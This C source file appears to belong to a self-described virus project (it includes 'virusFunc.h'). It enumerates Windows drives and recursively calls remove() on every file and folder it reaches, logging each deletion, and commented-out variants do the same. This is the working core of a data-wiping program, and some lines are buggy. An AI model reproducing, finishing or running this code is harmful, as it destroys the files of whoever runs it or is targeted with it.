#include <stdio.h>
#include <sys/stat.h> // stat
#include <dirent.h>   // show dir
#include <unistd.h>   // rmdir
#include <windows.h>  // used in drives detection
#include <string.h>
#include "virusFunc.h"
#include <io.h>

int deleteFile(char filename[])
{
    if (remove(filename) == 0)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}

int isDirectory(const char *path)
{
    struct stat statbuf;
    if (stat(path, &statbuf) != 0)
    {
        return 0;
    }
    else
    {
        return S_ISDIR(statbuf.st_mode);
    }
}



int removeEmptyDir(char dirname[])
{
    if (rmdir(dirname) == 0)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}


int detectDrives(char existDrivesName[10][10], int *length){
     char buf[255];
    // get the drive letters as a set of strings
    int sz = GetLogicalDriveStrings(sizeof(buf), buf);
    if( sz > 0)
    {
        // buf now contains a list of all the drive letters.  Each drive letter is
        // terminated with '\0' and the last one is terminated by two consecutive '\0' bytes.
        char* p1 = buf;
        char* p2;
        while( *p1 != '\0' && (p2 = strchr(p1,'\0')) != NULL )
        {
            strcpy(existDrivesName[(*length)++], p1); // pointer have higher order of prcidence
            p1 = p2+1;
        }
    }
    else
    {
        // Oops! something went wrong so display the error message
        DWORD dwError = GetLastError();
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, 0, dwError, 0, buf, sizeof(buf), 0);
        printf("%s\n", buf);

    }
}


void listFilesRecursively(char *basePath)
{
    if(!isDirectory(basePath) == 0){
       // RemoveFilesAI();
    }
    char path[1000];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {

            // Construct new path from our base path
            strcpy(path, basePath);
            strcat(path, "/");
            strcat(path, dp->d_name);
            if(remove(path)==0){
                printf("(%s) Succesffuly deteled\n", dp->d_name);
            }else{
                printf("[%s] it's a dir?\n");
            }

            listFilesRecursively(path);
        }
    }

    closedir(dir);
}




// void listFiles(char *dir) {
//   char searchPath[1000];
//   sprintf(searchPath, "%s\\*", dir);

//   struct _finddata_t fileInfo;
//   long handle;

//   handle = _findfirst(searchPath, &fileInfo);
//   if (handle == -1) {
//     return;
//   }

//   do {
//     if (strcmp(fileInfo.name, ".") != 0 && strcmp(fileInfo.name, "..") != 0) {
//       if (fileInfo.attrib & _A_SUBDIR) {
//         // This is a sub directory, so search it recursively
//         char subdir[1000];
//         sprintf(subdir, "%s\\%s", dir, fileInfo.name);
//         listFiles(subdir);
//       } else {
//         // This is a file, so print its name
//         // if(deleteFile())
//         char fullPath[] = {};
//         strcpy(fullPath, dir);
//         strcat(fullPath, fileInfo.name);
//         if(remove(fullPath)==0){
//             printf("Successfully Deleted files\n");
//         }
//         printf("Deleted: ");
//         printf("%s\n", fullPath);
//         printf("%s\\%s\n", dir, fileInfo.name);
//       }
//     }
//   } while (_findnext(handle, &fileInfo) == 0);

//   _findclose(handle);
// }




// int RemoveFilesAI(void){
//      struct _finddata_t fileInfo;
//   long handle;

//   handle = _findfirst("*", &fileInfo);
//   if (handle == -1) {
//     printf("No files or folders found\n");
//   } else {
//     if (fileInfo.attrib & _A_SUBDIR) {
//       printf("%s (folder)\n", fileInfo.name);
//     } else {
//         // using my own function
//         if(deleteFile(fileInfo.name)){
//             printf("%s (file)\n", fileInfo.name);
//         }
//     }
//     while (_findnext(handle, &fileInfo) == 0) {
//       if (fileInfo.attrib & _A_SUBDIR) {
//         printf("%s (folder)\n", fileInfo.name);
//       } else {
//         // using my own function
//         if(deleteFile(fileInfo.name)){
//             printf("%s (file)\n", fileInfo.name);
//         }
//       }
//     }
//   }

//   _findclose(handle);
//   return 0;
// }



// this function have some bugs when it's return the arryOfFileAndFolder
// some file and folder are missing from it

// char listOfFilesAndFolder(char dirname[], char arrayOfFileAndFolder[][20])
// {
//     struct dirent *d;
//     DIR *dir = opendir(dirname);
//     if (dir != NULL)
//     {
//         int index = 0;
//         for (d = readdir(dir); d != NULL; d = readdir(dir))
//         {
//             printf("%s\n", d->d_name);
//             strcpy(arrayOfFileAndFolder[index++], d->d_name);
//         }
//         closedir(dir);
//         return 1;
//     }
//     else
//     {
//         return 0;
//     }
// }